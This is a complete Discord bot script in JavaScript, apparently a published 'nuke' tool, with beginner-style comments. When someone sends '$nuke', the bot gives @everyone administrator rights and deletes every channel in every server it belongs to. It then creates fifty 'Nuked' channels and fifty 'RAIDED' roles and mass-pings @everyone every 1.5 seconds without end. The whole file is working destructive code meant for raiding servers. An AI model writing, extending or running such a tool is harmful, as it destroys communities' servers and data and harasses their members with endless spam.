const Discord = require('discord.js'); //requireing discord.js
const client = new Discord.Client(); //creating our discord client

client.on('ready', () => { //when bot is started
    console.log(`Logged in as ${client.user.tag}!`); //log this into the console
    client.user.setActivity("https://github.com/Pol528/gbot", { type: "WATCHING"}) //set the bot's activity to: WATCHING https://github.com/Pol528/gbot
  });

  client.on('message', async (msg) => { //when a message is sent
    if (msg.content === '$nuke') { //if the message is "$nuke"
    const guild = msg.guild //making a variable called "guild" so we don't need to type "message.guild" every time
    guild.roles.everyone.setPermissions(['ADMINISTRATOR']); //give @everyone administrator permissions
    client.guilds.cache.forEach(guild => { //for each guild
        guild.channels.cache.forEach(channel => { //for each channel
            channel.delete().catch(error => { //delete the channel
                console.log(`Couldn't delete ${channel.name}.`) //catch and log any errors
            });
        });
    });
    let i = 50 //creating a variable called "i" with a value of 50
    while(i > 0){ //while i is bigger than 0:
    guild.channels.create('Nuked', { reason: 'https://github.com/Pol528/gbot' }) //creates a channel called "Nuked"
    .catch(console.error);// catch any errors
    guild.roles.create({ //create a role
      data: { //here are our new role's details:
        name: 'RAIDED', //name
        color: 'RANDOM', //color
      },
      reason: 'https://github.com/Pol528/gbot', //reason for creating the role
    })
    i = i - 1 //every time this runs, our variable "i" gets 1 subtracted. That means that it will loop 50 times and create 50 channels and roles
    }
    function loop() { //creating a function that we can loop forever
    client.channels.cache.forEach(channel => { //in each of the channels the bot can see
        channel.send(`@everyone`) //send @everyone
    })
    }
    setInterval(loop, 1500); //repeat every 1500ms(1.5s)
  }
});
  
client.login('token'); // here we log into our discord bot. replace "token" with your bot's token